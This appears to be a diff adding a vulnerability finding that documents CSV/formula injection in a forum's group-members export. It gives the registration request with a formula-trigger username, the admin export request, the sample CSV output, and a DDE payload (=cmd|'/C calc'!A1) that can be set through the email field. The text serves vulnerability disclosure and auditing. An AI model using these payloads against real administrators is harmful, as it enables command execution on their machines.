@@ -1,0 +1,21 @@
+### VULN-010 — CSV/formula injection in group-members export
+
+### Attacker (unprivileged): register with a username starting with a formula trigger.
+### Usernames permit leading '+' and '-' (isUserNameValid); '=' and '@' are blocked in usernames,
+### but the EMAIL field permits them (isEmailValid only forbids ',' and ';'), enabling a full
+### =cmd|'/C calc'!A1 DDE payload via a self-set email.
+POST /api/v3/users   {"username":"+HYPERLINK_<rand>", ...}
+
+### Later, an ADMIN exports the group (note: getCSV requires a Referer under /admin/manage/groups):
+GET /api/admin/groups/<group>/csv HTTP/1.1
+Host: localhost:21372
+Cookie: express.sid=<admin sid>
+Referer: http://localhost:21372/admin/manage/groups
+
+# -> 200, text/csv:
+#    "email","username","uid"
+#    "","+HYPERLINK_<rand>",9        <-- username cell begins with '+', NOT prefixed with ' (un-neutralized)
+#
+# When the admin opens this in Excel/LibreOffice, a cell starting with = + - @ is evaluated as a formula
+# (formula/DDE injection). The users export (/api/admin/users/csv) neutralizes such cells; the group
+# export does not.
